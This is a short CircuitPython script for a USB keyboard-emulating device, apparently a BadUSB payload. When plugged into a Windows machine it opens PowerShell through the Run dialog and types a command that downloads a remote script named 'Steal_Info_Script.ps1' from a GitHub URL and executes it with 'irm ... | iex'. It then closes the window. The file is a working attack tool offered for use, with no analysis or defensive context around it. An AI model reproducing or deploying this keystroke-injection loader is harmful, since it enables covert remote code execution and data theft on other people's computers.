import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)

RawUrl = "https://raw.githubusercontent.com/imyimang/HID-Script/refs/heads/main/Steal_Info_Script.ps1"

def open(word):
    kbd.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.1)
    layout.write(word, delay = 0.01)
    kbd.send(Keycode.ENTER)
    time.sleep(2)

open("powershell")
ps = f"irm {RawUrl} | iex"

kbd.press(Keycode.ALT)
time.sleep(0.1)
kbd.send(Keycode.SHIFT)
time.sleep(0.1)
kbd.release(Keycode.ALT)
time.sleep(0.1)

layout.write(ps, delay = 0.01)
kbd.send(Keycode.ENTER)

time.sleep(1)
layout.write("exit", delay = 0.01)
kbd.send(Keycode.ENTER)